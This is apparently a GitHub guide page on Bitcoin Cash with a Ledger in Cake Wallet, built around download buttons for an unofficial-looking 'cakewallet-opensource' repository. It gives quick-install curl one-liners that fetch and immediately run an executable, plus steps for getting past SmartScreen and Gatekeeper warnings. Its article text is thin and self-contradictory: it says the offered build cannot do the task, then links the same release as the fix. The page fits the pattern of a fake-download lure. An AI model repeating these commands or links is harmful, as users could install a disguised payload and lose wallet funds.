![Cake Wallet bitcoin cash ledger guide](assets/cake-wallet-bitcoin-cash-ledger-article-banner.png)

# Bitcoin Cash on Ledger With Cake Wallet

A capability that arrived coin by coin, and how to tell if your build has it.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Bitcoin Cash on a Ledger needs a build that includes BCH device support; older builds do not, and the app will not tell you that is why the wallet is missing. Check your build first, connect the device over the supported connection, add the BCH wallet, then send and confirm on the device.

<!-- ARTICLE-BODY-BEGIN -->

## Which device
BCH support depends on the device and the coin together: a Ledger that signs Bitcoin is not automatically able to sign Bitcoin Cash in every app. Ledger is the evidenced vendor for this coin, and the connection type matters as much as the device.

Mobile connects over Bluetooth; on desktop, macOS supports Bluetooth devices while the Linux build supports no hardware wallets at all. If your platform is Linux, this route does not exist and the software wallet is the option.

## Where BCH sits in the coin list
Bitcoin Cash is part of the supported coin set, so a software BCH wallet works on any current build. The device route is the newer half of the capability, which is why it is the half that depends on your version.

<a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-supported-coins-networks.md">Cake Wallet supported coins</a> covers the whole coin set and the token rules, so you can confirm the coin is in scope before chasing a device problem.

## Install the release that added it
This is the one page where "update first" is not generic advice but the actual fix. BCH device support arrived in a later release than the desktop build published here, so the app on this page cannot add a BCH wallet on a Ledger at all.

Install the newer build from the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">current Cake Wallet release</a> before you connect anything. If the BCH option still does not appear, the build is the older one and the device cannot help.

## Adding and using the wallet
With a supporting build: connect the device, choose the hardware route when adding a wallet, pick Bitcoin Cash, and approve the address on the device screen. Sends are signed on the device and confirmed there, so a tampered app cannot redirect them silently.

Receiving works the same way in reverse: the app shows an address the device derived, and you confirm it on the device before sharing it. That check is the entire reason to use one.

## If the device fails
A lost or broken device is recovered with the device's recovery phrase, not with Cake Wallet's. The two are separate backups, and confusing them is the most expensive mistake available here.

Your Cake Wallet phrase covers software wallets you created in the app, including a BCH wallet made without a device. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-backup-recovery-phrase.md">Cake Wallet backup and recovery phrase</a> explains what one phrase covers when several wallets exist.

## Connecting it in the first place
The connection steps, the pairing flow and the per-platform limits are shared with every other coin. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-hardware-wallet.md">Connect a hardware wallet to Cake Wallet</a> is the page to read before this one if the device has never been paired.

## FAQ
### Can I use Ledger for Bitcoin Cash with Cake Wallet?
Only on a build that includes BCH device support. The older desktop build on this page does not, so update first.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[connect a hardware wallet to Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-hardware-wallet.md) · [Cake Wallet supported coins](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-supported-coins-networks.md) · [Cake Wallet backup and recovery phrase](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-backup-recovery-phrase.md) · [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
